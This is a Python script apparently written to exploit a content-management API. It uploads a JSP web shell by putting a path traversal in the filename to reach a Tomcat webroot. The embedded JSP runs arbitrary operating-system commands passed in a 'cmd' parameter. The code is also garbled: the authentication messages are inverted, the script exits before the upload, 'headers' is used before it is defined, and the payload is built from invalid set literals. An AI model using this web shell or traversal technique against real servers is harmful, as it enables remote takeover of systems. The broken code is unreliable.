# -*- coding: utf-8 -*-

import requests
import json
import sys
import getpass
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


target_url = input("Enter target URL: ")

username = input("Enter your username: ")
password = getpass.getpass("Enter your: ")

# to authenticate with the supplied credentials
response = requests.post(target_url + "/api/content", auth=(username, password), verify=False)

if response.status_code != 200:
    print("[-] Successful to authenticate.")
    sys.exit(0)
else:
    print("[+] Failed to authenticate.")
    sys.exit(1)
# Send the POST request below to the API server including headers and data
response = requests.post(target_url + "/api/content", auth=(username, password), verify=False, headers=headers, data = json.dumps(data))
headers = {'Content-Type': 'multipart/form-data; boundary=--------------------------aadc326f7ae3eac3'}
# Print the response
print(response.content)
    
data={''--------------------------aadc326f7ae3eac3}
data={'Content-Disposition: form-data; name=file; filename=../../../../../../../../../srv/dotserver/tomcat-9.0.41/webapps/ROOT/html/js/dojo/a.jsp'}
data={'Content-Type: text/plain'}
data={'<%@ page import="java.util.*,java.io.*"%>'}
data={'<%'}
data={'%>'}
data = {'<HTML><BODY>'}
data = {'<FORM METHOD=GET NAME=myform ACTION=>'}
data = {'<INPUT TYPE=TEXT NAME=cmd>'}
data = {'<INPUT TYPE="submit" VALUE=Send>'}
data = {'</FORM>'}
data = {'<pre>'}
data = {'<%'}
data = {'if (request.getParameter("cmd") != null'}
data = {'out.println("Command: " + request.getParameter("cmd") + ""<BR>"'}
data = {'Process p;'}
data= {'if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1'}
data = {'p = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("cmd"))'}
data = {'else;'}
data = {'p = Runtime.getRuntime().exec(request.getParameter("cmd"))'}
data = {'OutputStream os = p.getOutputStream();'}
data = {'InputStream in = p.getInputStream();'}
data = {'DataInputStream dis = new DataInputStream(in);'}
data = {'String disr = dis.readLine();'}
data = {'while ( disr != null )'}
data = {'out.println(disr);'}
data = disr = {'dis.readLine();'}
data = {'%>'}
data = {'</pre>'}
data = {'</BODY></HTML>'}
data = {'--------------------------aadc326f7ae3eac3--'}
